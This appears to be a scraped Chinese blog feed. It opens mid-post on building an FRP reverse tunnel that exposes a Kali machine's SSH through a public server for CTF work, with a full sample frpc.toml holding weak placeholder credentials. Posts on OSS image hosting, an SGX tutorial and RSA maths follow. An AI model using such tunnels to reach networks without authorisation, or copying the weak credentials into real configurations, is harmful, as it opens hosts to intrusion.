但此时只相当于在公网服务器的192.168.50.1的60688端口搭建了一个socks5代理隧道，如果想要本地使用该隧道是行不通的，因为192.168.50.1相当于一个内网地址，是不能直接访问得到的，所以需要将公网服务器虚拟网卡地址192.168.50.1的60688端口数据转发到公网服务器公网地址的一个端口上。这个端口转发我还没试(不知道采用哪个工具会好点)。 这里使用FRP搭建反向隧道 3.FRP搭建隧道下载FRP对应的版本，因为FRP在0.50以后更新，语法与操作和之前的版本很不一样，因此咨询了一个大佬新版本的使用方法，下面链接时FRP的下载地址。 https://github.com/fatedier/frp/releases/tag/v0.52.3 下面是下载后的目录结构 frps是服务端的执行文件，对应的frps.tonl是服务端的配置文件。 相应的frpc是服务端的执行文件，对应的frpc.tonl是服务端的配置文件。 服务端配置 配置文件frps.tonl 123serverAddr = &quot;192.168.50.1&quot;serverPort = 7000 1frps -c frps.tonl 客户端配置 配置文件frpc.tonl(tcp链接) 12345678serverAddr = &quot;192.168.50.2&quot;serverPort = 7000[[proxies]]name = &quot;kali-ssh&quot;type = &quot;tcp&quot;localIP = &quot;127.0.0.1&quot;localPort = 22remotePort = 6000 执行命令 1frpc -c frpc.tonl 可以看到客户端有一条新的连接命令 连接命令 1ssh -o --Port=6000 root@192.168.50.2 我们开启一个新虚拟机通过连接服务端的FRP直接连接到kali上，成功连接。 此外附上所有的frpc.toml配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360# your proxy name will be changed to &#123;user&#125;.&#123;proxy&#125;user = &quot;your_name&quot;# A literal address or host name for IPv6 must be enclosed# in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;# For single serverAddr field, no need square brackets, like serverAddr = &quot;::&quot;.serverAddr = &quot;0.0.0.0&quot;serverPort = 7000# STUN server to help penetrate NAT hole.# natHoleStunServer = &quot;stun.easyvoip.com:3478&quot;# Decide if exit program when first login failed, otherwise continuous relogin to frps# default is trueloginFailExit = true# console or real logFile path like ./frpc.loglog.to = &quot;./frpc.log&quot;# trace, debug, info, warn, errorlog.level = &quot;info&quot;log.maxDays = 3# disable log colors when log.to is console, default is falselog.disablePrintColor = falseauth.method = &quot;token&quot;# auth.additionalScopes specifies additional scopes to include authentication information.# Optional values are HeartBeats, NewWorkConns.# auth.additionalScopes = [&quot;HeartBeats&quot;, &quot;NewWorkConns&quot;]# auth tokenauth.token = &quot;12345678&quot;# oidc.clientID specifies the client ID to use to get a token in OIDC authentication.# auth.oidc.clientID = &quot;&quot;# oidc.clientSecret specifies the client secret to use to get a token in OIDC authentication.# auth.oidc.clientSecret = &quot;&quot;# oidc.audience specifies the audience of the token in OIDC authentication.# auth.oidc.audience = &quot;&quot;# oidc_scope specifies the permisssions of the token in OIDC authentication if AuthenticationMethod == &quot;oidc&quot;. By default, this value is &quot;&quot;.# auth.oidc.scope = &quot;&quot;# oidc.tokenEndpointURL specifies the URL which implements OIDC Token Endpoint.# It will be used to get an OIDC token.# auth.oidc.tokenEndpointURL = &quot;&quot;# oidc.additionalEndpointParams specifies additional parameters to be sent to the OIDC Token Endpoint.# For example, if you want to specify the &quot;audience&quot; parameter, you can set as follow.# frp will add &quot;audience=&lt;value&gt;&quot; &quot;var1=&lt;value&gt;&quot; to the additional parameters.# auth.oidc.additionalEndpointParams.audience = &quot;https://dev.auth.com/api/v2/&quot;# auth.oidc.additionalEndpointParams.var1 = &quot;foobar&quot;# Set admin address for control frpc&#x27;s action by http api such as reloadwebServer.addr = &quot;127.0.0.1&quot;webServer.port = 7400webServer.user = &quot;admin&quot;webServer.password = &quot;admin&quot;# Admin assets directory. By default, these assets are bundled with frpc.# webServer.assetsDir = &quot;./static&quot;# Enable golang pprof handlers in admin listener.webServer.pprofEnable = false# The maximum amount of time a dial to server will wait for a connect to complete. Default value is 10 seconds.# transport.dialServerTimeout = 10# dialServerKeepalive specifies the interval between keep-alive probes for an active network connection between frpc and frps.# If negative, keep-alive probes are disabled.# transport.dialServerKeepalive = 7200# connections will be established in advance, default value is zerotransport.poolCount = 5# If tcp stream multiplexing is used, default is true, it must be same with frps# transport.tcpMux = true# Specify keep alive interval for tcp mux.# only valid if tcpMux is enabled.# transport.tcpMuxKeepaliveInterval = 60# Communication protocol used to connect to server# supports tcp, kcp, quic, websocket and wss now, default is tcptransport.protocol = &quot;tcp&quot;# set client binding ip when connect server, default is empty.# only when protocol = tcp or websocket, the value will be used.transport.connectServerLocalIP = &quot;0.0.0.0&quot;# if you want to connect frps by http proxy or socks5 proxy or ntlm proxy, you can set proxyURL here or in global environment variables# it only works when protocol is tcp# transport.proxyURL = &quot;http://user:passwd@192.168.1.128:8080&quot;# transport.proxyURL = &quot;socks5://user:passwd@192.168.1.128:1080&quot;# transport.proxyURL = &quot;ntlm://user:passwd@192.168.1.128:2080&quot;# quic protocol options# transport.quic.keepalivePeriod = 10# transport.quic.maxIdleTimeout = 30# transport.quic.maxIncomingStreams = 100000# If tls.enable is true, frpc will connect frps by tls.# Since v0.50.0, the default value has been changed to true, and tls is enabled by default.transport.tls.enable = true# transport.tls.certFile = &quot;client.crt&quot;# transport.tls.keyFile = &quot;client.key&quot;# transport.tls.trustedCaFile = &quot;ca.crt&quot;# transport.tls.serverName = &quot;example.com&quot;# If the disableCustomTLSFirstByte is set to false, frpc will establish a connection with frps using the# first custom byte when tls is enabled.# Since v0.50.0, the default value has been changed to true, and the first custom byte is disabled by default.# transport.tls.disableCustomTLSFirstByte = true# Heartbeat configure, it&#x27;s not recommended to modify the default value.# The default value of heartbeat_interval is 10 and heartbeat_timeout is 90. Set negative value# to disable it.# transport.heartbeatInterval = 30# transport.heartbeatTimeout = 90# Specify a dns server, so frpc will use this instead of default one# dnsServer = &quot;8.8.8.8&quot;# Proxy names you want to start.# Default is empty, means all proxies.# start = [&quot;ssh&quot;, &quot;dns&quot;]# Specify udp packet size, unit is byte. If not set, the default value is 1500.# This parameter should be same between client and server.# It affects the udp and sudp proxy.udpPacketSize = 1500# Additional metadatas for client.metadatas.var1 = &quot;abc&quot;metadatas.var2 = &quot;123&quot;# Include other config files for proxies.# includes = [&quot;./confd/*.ini&quot;][[proxies]]# &#x27;ssh&#x27; is the unique proxy name# If global user is not empty, it will be changed to &#123;user&#125;.&#123;proxy&#125; such as &#x27;your_name.ssh&#x27;name = &quot;ssh&quot;type = &quot;tcp&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# Limit bandwidth for this proxy, unit is KB and MBtransport.bandwidthLimit = &quot;1MB&quot;# Where to limit bandwidth, can be &#x27;client&#x27; or &#x27;server&#x27;, default is &#x27;client&#x27;transport.bandwidthLimitMode = &quot;client&quot;# If true, traffic of this proxy will be encrypted, default is falsetransport.useEncryption = false# If true, traffic will be compressedtransport.useCompression = false# Remote port listen by frpsremotePort = 6001# frps will load balancing connections for proxies in same grouploadBalancer.group = &quot;test_group&quot;# group should have same group keyloadBalancer.groupKey = &quot;123456&quot;# Enable health check for the backend service, it supports &#x27;tcp&#x27; and &#x27;http&#x27; now.# frpc will connect local service&#x27;s port to detect it&#x27;s healthy statushealthCheck.type = &quot;tcp&quot;# Health check connection timeouthealthCheck.timeoutSeconds = 3# If continuous failed in 3 times, the proxy will be removed from frpshealthCheck.maxFailed = 3# every 10 seconds will do a health checkhealthCheck.intervalSeconds = 10# additional meta info for each proxymetadatas.var1 = &quot;abc&quot;metadatas.var2 = &quot;123&quot;[[proxies]]name = &quot;ssh_random&quot;type = &quot;tcp&quot;localIP = &quot;192.168.31.100&quot;localPort = 22# If remote_port is 0, frps will assign a random port for youremotePort = 0[[proxies]]name = &quot;dns&quot;type = &quot;udp&quot;localIP = &quot;114.114.114.114&quot;localPort = 53remotePort = 6002# Resolve your domain names to [server_addr] so you can use http://web01.yourdomain.com to browse web01 and http://web02.yourdomain.com to browse web02[[proxies]]name = &quot;web01&quot;type = &quot;http&quot;localIP = &quot;127.0.0.1&quot;localPort = 80# http username and password are safety certification for http protocol# if not set, you can access this custom_domains without certificationhttpUser = &quot;admin&quot;httpPassword = &quot;admin&quot;# if domain for frps is frps.com, then you can access [web01] proxy by URL http://web01.frps.comsubdomain = &quot;web01&quot;customDomains = [&quot;web01.yourdomain.com&quot;]# locations is only available for http typelocations = [&quot;/&quot;, &quot;/pic&quot;]# route requests to this service if http basic auto user is abc# route_by_http_user = abchostHeaderRewrite = &quot;example.com&quot;# params with prefix &quot;header_&quot; will be used to update http request headersrequestHeaders.set.x-from-where = &quot;frp&quot;healthCheck.type = &quot;http&quot;# frpc will send a GET http request &#x27;/status&#x27; to local http service# http service is alive when it return 2xx http response codehealthCheck.path = &quot;/status&quot;healthCheck.intervalSeconds = 10healthCheck.maxFailed = 3healthCheck.timeoutSeconds = 3[[proxies]]name = &quot;web02&quot;type = &quot;https&quot;localIP = &quot;127.0.0.1&quot;localPort = 8000subdomain = &quot;web02&quot;customDomains = [&quot;web02.yourdomain.com&quot;]# if not empty, frpc will use proxy protocol to transfer connection info to your local service# v1 or v2 or emptytransport.proxyProtocolVersion = &quot;v2&quot;[[proxies]]name = &quot;tcpmuxhttpconnect&quot;type = &quot;tcpmux&quot;multiplexer = &quot;httpconnect&quot;localIP = &quot;127.0.0.1&quot;localPort = 10701customDomains = [&quot;tunnel1&quot;]# routeByHTTPUser = &quot;user1&quot;[[proxies]]name = &quot;plugin_unix_domain_socket&quot;type = &quot;tcp&quot;remotePort = 6003# if plugin is defined, local_ip and local_port is useless# plugin will handle connections got from frps[proxies.plugin]type = &quot;unix_domain_socket&quot;unixPath = &quot;/var/run/docker.sock&quot;[[proxies]]name = &quot;plugin_http_proxy&quot;type = &quot;tcp&quot;remotePort = 6004[proxies.plugin]type = &quot;http_proxy&quot;httpUser = &quot;abc&quot;httpPassword = &quot;abc&quot;[[proxies]]name = &quot;plugin_socks5&quot;type = &quot;tcp&quot;remotePort = 6005[proxies.plugin]type = &quot;socks5&quot;username = &quot;abc&quot;password = &quot;abc&quot;[[proxies]]name = &quot;plugin_static_file&quot;type = &quot;tcp&quot;remotePort = 6006[proxies.plugin]type = &quot;static_file&quot;localPath = &quot;/var/www/blog&quot;stripPrefix = &quot;static&quot;httpUser = &quot;abc&quot;httpPassword = &quot;abc&quot;[[proxies]]name = &quot;plugin_https2http&quot;type = &quot;https&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;https2http&quot;localAddr = &quot;127.0.0.1:80&quot;crtPath = &quot;./server.crt&quot;keyPath = &quot;./server.key&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;plugin_https2https&quot;type = &quot;https&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;https2https&quot;localAddr = &quot;127.0.0.1:443&quot;crtPath = &quot;./server.crt&quot;keyPath = &quot;./server.key&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;plugin_http2https&quot;type = &quot;http&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;http2https&quot;localAddr = &quot;127.0.0.1:443&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;secret_tcp&quot;# If the type is secret tcp, remote_port is useless# Who want to connect local port should deploy another frpc with stcp proxy and role is visitortype = &quot;stcp&quot;# secretKey is used for authentication for visitorssecretKey = &quot;abcdefg&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# If not empty, only visitors from specified users can connect.# Otherwise, visitors from same user can connect. &#x27;*&#x27; means allow all users.allowUsers = [&quot;*&quot;][[proxies]]name = &quot;p2p_tcp&quot;type = &quot;xtcp&quot;secretKey = &quot;abcdefg&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# If not empty, only visitors from specified users can connect.# Otherwise, visitors from same user can connect. &#x27;*&#x27; means allow all users.allowUsers = [&quot;user1&quot;, &quot;user2&quot;]# frpc role visitor -&gt; frps -&gt; frpc role server[[visitors]]name = &quot;secret_tcp_visitor&quot;type = &quot;stcp&quot;# the server name you want to visitorserverName = &quot;secret_tcp&quot;secretKey = &quot;abcdefg&quot;# connect this address to visitor stcp serverbindAddr = &quot;127.0.0.1&quot;# bindPort can be less than 0, it means don&#x27;t bind to the port and only receive connections redirected from# other visitors. (This is not supported for SUDP now)bindPort = 9000[[visitors]]name = &quot;p2p_tcp_visitor&quot;type = &quot;xtcp&quot;# if the server user is not set, it defaults to the current userserverUser = &quot;user1&quot;serverName = &quot;p2p_tcp&quot;secretKey = &quot;abcdefg&quot;bindAddr = &quot;127.0.0.1&quot;# bindPort can be less than 0, it means don&#x27;t bind to the port and only receive connections redirected from# other visitors. (This is not supported for SUDP now)bindPort = 9001# when automatic tunnel persistence is required, set it to truekeepTunnelOpen = false# effective when keep_tunnel_open is set to true, the number of attempts to punch through per hourmaxRetriesAnHour = 8minRetryInterval = 90# fallbackTo = &quot;stcp_visitor&quot;# fallbackTimeoutMs = 500","categories":[{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/categories/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/tags/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"author":"Sn0wma1n"},{"title":"解决Gitee图床不显示问题(使用阿里云OSS搭建图床)","slug":"解决Gitee图床不显示问题","date":"2023-09-02T08:51:50.000Z","updated":"2024-02-03T17:05:10.725Z","comments":true,"path":"2023/09/02/解决Gitee图床不显示问题/","link":"","permalink":"https://snowman12137.github.io/2023/09/02/%E8%A7%A3%E5%86%B3Gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/","excerpt":"","text":"问题前段时间搞博客弄了一个Gitee图床，图片可以上传成功，外部链接可以打开图片，但是hexo s后本地都打开不了图片，但是相应的源码标签里依然有图片链接地址。这就让我很疑惑。 报错是class=lazyload error 可以看到下图这里是有图片的，就是不能显示。 在网上并没有找到相关的报错解释，然后我又查找了lazyload是懒加载，但是也没有查明相关的报错解决方法，于是我又怀疑是主题的问题。 在_config.yml里注释掉theme以后发现报错 错误是不能加载，有可能是Gitee的权限问题(是公共库)，导致服务器不能访问库里面的图片。 然后我找到了这样一篇文章： gitee图床不能用了，心态崩了 原来是Gitee从去年开始已经不支持图床了。然后发现阿里云是比较好用的一个图床，毕竟是付费的(40G 1年 9RMB) 搭建阿里云OSS图床+PicGO1.购买阿里云OSS服务 登录阿里云 打开侧边栏选择对象存储OSS 进入管理控制台 点击创建Bucket 有的人在区域一栏没有买过流量包，会提醒购买 读写权限注意是公共读，博客需要读取你上传后的图片 购买资源包 2.添加用户权限我们需要添加一个可以操作OSS的用户，在配置好PicGO后使用这个用户对图片进行自动添加。 点击访问控制 点击用户，新建用户 输入名称，注意勾选OpenAPI调用访问 这里要记下AccessKey ID 和 AccessKeySecret，之后配置PICGO用到，因为这个界面关掉之后就不好找了，所以最好 记在记事本里 设置用户权限 选择管理对象存储OSS服务权限，点击确定，如下图所示： 3.配置PICGO 下载PICGO里面有相应操作系统的安装包文件以及源码，点击下载安装文件即可。 安装完成后，打开图床设置，点击阿里云OSS，得到如下界面 注意设定keyid，就是创建用户的AccessKey ID，KeySecret 就是AccessKeySecret，存储空间名就是创建Bucket的名字，存储区域也是创建时设定的， 忘记的可以通过Bucket概览查看，如下图所示： 存储路径默认设置img&#x2F;即可，如果自己有已经备案的域名，可以填写设定自定义域名，如果没有不填即可。 可以看到PICGO能够文件上传，也支持剪贴板上传。上传过程为： 拖拽文件或点击上传文件或点击剪贴板图片上传。 上传完成后电脑剪贴板里就有了所选链接格式的图片链接。 到相应的地方粘贴即可。 开始可能有疑问，我的图片存到哪里了呢？很简单，点击文件管理，如下图所示： 看到img文件夹了吗？就在里面了，你可以在文件夹里对图片进行删除等操作。 4.配置Typora 打开typora点击偏好设置 然后配置如下选项 1.点击图像 2.选择上传图片 3.上传服务选择PICGO 4.找到PICGO安装的位置，即PicGo.exe的位置 点击验证图片上传选项即可 注意可以1.右键桌面图标 2.点击属性 3.负值路径 Over 下课","categories":[{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"}],"author":"Sn0wma1n"},{"title":"SGX(Software Guard eXtensions)_linux构建可信执行环境(一)","slug":"SGX-Software-Guard-eXtensions-构建可信执行环境-一","date":"2023-09-02T08:42:16.000Z","updated":"2023-09-06T09:55:34.893Z","comments":true,"path":"2023/09/02/SGX-Software-Guard-eXtensions-构建可信执行环境-一/","link":"","permalink":"https://snowman12137.github.io/2023/09/02/SGX-Software-Guard-eXtensions-%E6%9E%84%E5%BB%BA%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83-%E4%B8%80/","excerpt":"","text":"SGX(Software Guard eXtensions)_linux构建可信执行环境(一)：如何开发第一个最简单的 SGX 应用 HelloWorld一、了解SGX1.1SGX定义 Intel 软件防护扩展SGX（Software Guard Extension）是一项针对台式机和服务器平台的旨在满足可信计算需求的技术。Intel SGX是Intel架构新的扩展，在原有架构上增加了一组新的指令集和内存访问机制。 Intel在2015年从第6代Intel酷睿处理器平台开始引入了Intel软件防护扩展新指令集，使用特殊指令和软件可将应用程序代码放入一个enclave中执行。Enclave可以提供一个隔离的可信执行环境，可以在BIOS、虚拟机监控器、主操作系统和驱动程序均被恶意代码攻陷的情况下，仍对enclave内的代码和内存数据提供保护，防止恶意软件影响enclave内的代码和数据，从而保障用户的关键代码和数据的机密性和完整性。 1.2基本原理 SGX应用由两部分组成： untrusted 不可信区：代码和数据运行在普通非加密内存区域，程序main入口必须在非可信区。 trusted 可信区：代码和数据运行在硬件加密内存区域，此区域由CPU创建的且只有CPU有权限访问。 当一个安全区域函数被调用时，只有安全区域内的代码才能看到其数据，外部访问总是被拒绝；返回时，安全区数据将保留在受保护的内存中。 非可信区只能通过ECALL函数调用可信区内的函数，可信区只能通过OCALL函数调用非可信区的函数，ECALL函数和OCALL函数通过EDL文件声明。 1.3两大机制1.3.1保护机制针对enclave的保护机制主要包括两个部分：一是enclave内存访问语义的变化，二是应用程序地址映射关系的保护。这两项功能共同完成对enclave的机密性和完整性的保护。 1.3.2 认证机制SGX 提出了两种类型的身份认证方式：一种是平台内部 enclave 间的认证，用来认证进行报告的 enclave 和自己是否运行在同一个平台上；另一种是平台间的远程认证，用于远程的认证者认证 enclave 的身份信息。 本地证明：同一平台的两个Enclave之间的证明过程。 远程证明：Enclave和不在平台上的第三方之间的证明过程。 二、Linux下安装SGX 简介：我们需要安装几个东西。第一是驱动Drive，有了驱动才可以调用intel芯片里面的硬件部分。第二个是PSW(平台软件)，其是允许支持SGX的应用程序在目标平台上执行的软件栈，包含四部分1.提供对硬件功能进行访问的驱动程序；2.为执行和认证提供多个支持库；3.运行所必需的架构型enclave；4.加载并与enclave进行通信的服务；。第三个是软件开发工具包（SDK）为开发人员提供了开发支持SGX的应用程序所需的一切，它由一个生成应用程序和enclave之间的接口函数的工具，一个在使用它之前对enclave进行签名的工具，一个调试它的工具以及一个性能检查的工具组成。另外，它还包含模板和样本参数，用于在Windows下使用Visual Studio开发enclave，或在Linux下使用Makefile。 有了这三样东西我们才可以进行代码开发 以Ubuntu20.04 LTS为例 硬件需求仅当安装sgx驱动和PSW时需要，安装sgx sdk并不需要硬件支持。 硬件不支持的情况下，可以在模拟环境下编写测试SGX程序，其中makefile里SGX_MODE&#x3D;SIM。（虽然 SGX是基于硬件的，但是依旧可以使用软件条件进行模拟） 先安装驱动、PSW、SDK所需依赖 123sudo apt-get updatesudo apt-get install libssl-dev libcurl4-openssl-dev libprotobuf-devsudo apt-get install build-essential python 下载Intel SGX驱动并安装 注意所有版本的驱动、SPW、SDK都在这里https://download.01.org/intel-sgx/sgx-linux/2.21/distro/ 1234wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/sgx_linux_x64_driver_2.6.0_4f5bb63.binchmod +x sgx_linux_x64_driver_2.6.0_4f5bb63.binsudo ./sgx_linux_x64_driver_2.6.0_4f5bb63.binsudo reboot 注意安装完重启才生效 下载Intel SGX PSW并安装 注意：有的版本的没有PSW文件，也可以不装 12wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/libsgx-enclave-common_2.7.101.3-bionic1_amd64.debsudo dpkg -i ./libsgx-enclave-common_2.7.101.3-bionic1_amd64.deb 下载并安装Intel SGX SDK 安装过程中可以手动输入SDK要安装到的目标位置 123wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/sgx_linux_x64_sdk_2.7.101.3.binchmod +x ./sgx_linux_x64_sdk_2.7.101.3.bin./sgx_linux_x64_sdk_2.7.101.3.bin 添加环境变量，执行上一步结束时输出的命令 1source /path/to/sgxsdk/environment 接下来进入到sgxsdk&#x2F;SampleCode&#x2F;SampleEnclave文件夹里 1cd /path/to/sgxsdk/SampleCode/SampleEnclave 编辑一下Makefile 12345678# Intel SGX SDK 的安装位置SGX_SDK ?= /home/luoyhang003/SGX/sgxsdk# 运行类型：HW 真实环境；SIM 模拟器环境SGX_MODE ?= SIM# 运行架构：仅支持 64 位SGX_ARCH ?= x64# 是否为：Debug 调试模式SGX_DEBUG ?= 1 退出然后运行示例 1234# 编译sudo make# 运行./app 注意一定要添加环境变量source &#x2F;path&#x2F;to&#x2F;sgxsdk&#x2F;environment，这行命令是临时环境变量，即存活时间为一个终端的市场，一旦重启或开启新的终端环境变量即会失效，需要手动添加。也可以永久化环境变量。 成功运行截图 三、文件结构与代码目录结构 编译&amp;运行 1234567891011121314151617181920212223242526272829303132$ makeGEN =&gt; App/Enclave_u.hCC &lt;= App/Enclave_u.cCXX &lt;= App/App.cppLINK =&gt; appGEN =&gt; Enclave/Enclave_t.hCC &lt;= Enclave/Enclave_t.cCXX &lt;= Enclave/Enclave.cppLINK =&gt; enclave.so&lt;EnclaveConfiguration&gt; &lt;ProdID&gt;0&lt;/ProdID&gt; &lt;ISVSVN&gt;0&lt;/ISVSVN&gt; &lt;StackMaxSize&gt;0x40000&lt;/StackMaxSize&gt; &lt;HeapMaxSize&gt;0x100000&lt;/HeapMaxSize&gt; &lt;TCSNum&gt;10&lt;/TCSNum&gt; &lt;TCSPolicy&gt;1&lt;/TCSPolicy&gt; &lt;!-- Recommend changing &#x27;DisableDebug&#x27; to 1 to make the enclave undebuggable for enclave release --&gt; &lt;DisableDebug&gt;0&lt;/DisableDebug&gt; &lt;MiscSelect&gt;0&lt;/MiscSelect&gt; &lt;MiscMask&gt;0xFFFFFFFF&lt;/MiscMask&gt;&lt;/EnclaveConfiguration&gt;tcs_num 10, tcs_max_num 10, tcs_min_pool 1The required memory is 3960832B.The required memory is 0x3c7000, 3868 KB.Succeed.SIGN =&gt; enclave.signed.soThe project has been built in debug hardware mode.$ ./appHello worldInfo: SampleEnclave successfully returned.Enter a character before exit ... 编译流程(Makefile) 通过 sgx_edger8r 工具在 App/ 目录下生成不可信代码(Enclave_u.c 和 Enclave_u.h)，这部分生成代码主要会调用 ECALL (sgx_ecall)； 编译不可信部分 Binary: app； 通过sgx_edger8r 工具在 Enclave/ 目录下生成可信代码(Enclave_t.c 和 Enclave_t.h)； 编译可信动态链接库(enclave.so)； 通过sgx_sing工具签名可信动态链接库(enclave.signed.so)； 结束。 编译后目录结构 123456789101112131415161718192021222324HelloWorld├── app├── App│ ├── App.cpp│ ├── App.h│ ├── App.o #[generated]│ ├── Enclave_u.c #[generated] │ ├── Enclave_u.h #[generated] │ └── Enclave_u.o #[generated]├── Enclave│ ├── Enclave.config.xml│ ├── Enclave.cpp│ ├── Enclave.edl│ ├── Enclave.h│ ├── Enclave.lds│ ├── Enclave.o #[generated]│ ├── Enclave_private.pem│ ├── Enclave_t.c #[generated]│ ├── Enclave_t.h #[generated]│ └── Enclave_t.o #[generated]├── enclave.signed.so #[generated]├── enclave.so #[generated]├── Include└── Makefile HelloWorld 大概流程如下 1.添加可信函数Encalve&#x2F;Enclave.edl 12345enclave &#123; trusted &#123; public void ecall_hello_from_enclave([out, size=len] char* buf, size_t len); &#125;;&#125;; 2.在可信区域定义可信函数Enclave&#x2F;Enclave.cpp 1234567891011121314151617#include &quot;Enclave.h&quot;#include &quot;Enclave_t.h&quot; /* print_string */#include &lt;string.h&gt;void ecall_hello_from_enclave(char *buf, size_t len)&#123; const char *hello = &quot;Hello world&quot;; size_t size = len; if(strlen(hello) &lt; len) &#123; size = strlen(hello) + 1; &#125; memcpy(buf, hello, size - 1); buf[size-1] = &#x27;\\0&#x27;;&#125; 3.调用可信函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;# include &lt;unistd.h&gt;# include &lt;pwd.h&gt;# define MAX_PATH FILENAME_MAX#include &quot;sgx_urts.h&quot;#include &quot;App.h&quot;#include &quot;Enclave_u.h&quot;/* Global EID shared by multiple threads */sgx_enclave_id_t global_eid = 0;int initialize_enclave(void)&#123; sgx_status_t ret = SGX_ERROR_UNEXPECTED; /* 调用 sgx_create_enclave 创建一个 Enclave 实例 */ /* Debug Support: set 2nd parameter to 1 */ ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &amp;global_eid, NULL); if (ret != SGX_SUCCESS) &#123; printf(&quot;Failed to create enclave, ret code: %d\\n&quot;, ret); return -1; &#125; return 0;&#125;/* 应用程序入口 */int SGX_CDECL main(int argc, char *argv[])&#123; (void)(argc); (void)(argv); const size_t max_buf_len = 100; char buffer[max_buf_len] = &#123;0&#125;; /* 创建并初始化 Enclave */ if(initialize_enclave() &lt; 0)&#123; printf(&quot;Enter a character before exit ...\\n&quot;); getchar(); return -1; &#125;//-------------------------添加代码区域------------------------------------ /* ECALL 调用 */ ecall_hello_from_enclave(global_eid, buffer, max_buf_len); printf(&quot;%s\\n&quot;, buffer);//------------------------------------------------------------------------ /* 销毁 Enclave */ sgx_destroy_enclave(global_eid); printf(&quot;Info: SampleEnclave successfully returned.\\n&quot;); printf(&quot;Enter a character before exit ...\\n&quot;); getchar(); return 0;&#125; 总结即便最简单的 SGX HelloWold 也比较复杂，当然“安全性”和“成本”（技术壁垒门槛、开发成本、维护成本、物料成本等）总是成正比的，和“效率”成反比的。希望这篇文章对那些想入门开发 SGX 应用的用户有所帮助。","categories":[{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/categories/SGX/"}],"tags":[{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/tags/SGX/"},{"name":"Linux","slug":"Linux","permalink":"https://snowman12137.github.io/tags/Linux/"}],"author":"Sn0wma1n"},{"title":"RSA数学原理解析","slug":"RSA数学原理解析","date":"2023-05-15T03:18:16.000Z","updated":"2023-09-02T14:32:10.629Z","comments":true,"path":"2023/05/15/RSA数学原理解析/","link":"","permalink":"https://snowman12137.github.io/2023/05/15/RSA%E6%95%B0%E5%AD%A6%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/","excerpt":"","text":"1.引言 RSA算法(RSA algorithm)是一种非对称加密算法, 广泛应用在互联网和电子商务中. 它使用一对密钥进行加密和解密, 分别称为公钥(public key)和私钥(private key). 使用公钥加密的内容只能用私钥解密, 使用私钥加密的内容只能用公钥解密, 并且不能通过公钥在可行的时间内计算出私钥. 这使得加密通信不需要交换私钥, 保证了通信的安全. 那么它是怎么做到这一点的呢? 背后有哪些数学原理? 这篇文章我们来讨论这个问题. 本文会先介绍RSA算法中用到的数论概念和定理: 模算术, 最大公约数与贝祖定理, 线性同余方程, 中国余数定理, 费马小定理; 然后再介绍RSA算法的原理, 并证明其是有效的. 本文会假设你了解数论的基本概念, 如素数, 最大公约数, 互素等 2.模算术2.1整数除法用一个正整数去除一个整数，可以得到一个商和一个余数，数学符号定义为： 定理1：令 a 为整数, d 为正整数, 则存在唯一的整数 q 和 r, 满足 $0\\leq r&lt;d$, 使得 $a&#x3D;dq+r$ 当r&#x3D;0时，我们称 d 整除 a, 记作$d|a$; 否则称 d 不整除 a, 记作 $d\\nmid a$，整除有以下基本性质: 定理2：令a,b,c,为整数，其中$a\\neq0$,则：如果$a|b$且$a|c$则$a|(a+b)$ 2.2模算术在数论中我们特别关心一个整数被一个正整数除时的余数. 我们用 $a\\bmod m&#x3D;b$ 表示整数 a 除以正整数 m 的余数是 b. 为了表示两个整数被一个正整数除时的余数相同, 人们又提出了同余式(congruence). 定义1:如果 a 和 b 是整数而 m 是正整数, 则当 m 整除 a - b 时称 a 模 m 同余 b. 记作 $a\\equiv b(\\bmod m)$ $a\\equiv b(\\bmod m)$ 和 $a\\bmod m&#x3D;b$很相似. 事实上, 如果 $a\\bmod 